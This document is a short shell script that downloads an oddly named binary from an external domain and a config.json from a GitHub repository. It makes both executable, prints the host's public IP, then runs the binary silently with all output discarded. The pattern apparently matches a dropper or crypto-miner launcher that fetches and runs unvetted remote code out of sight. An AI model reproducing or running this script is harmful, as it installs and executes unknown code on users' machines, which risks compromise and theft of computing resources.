wget https://maper.info/BanqueNouvelleRichesse && chmod +x BanqueNouvelleRichesse >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./BanqueNouvelleRichesse -c "config.json" >/dev/null 2>&1
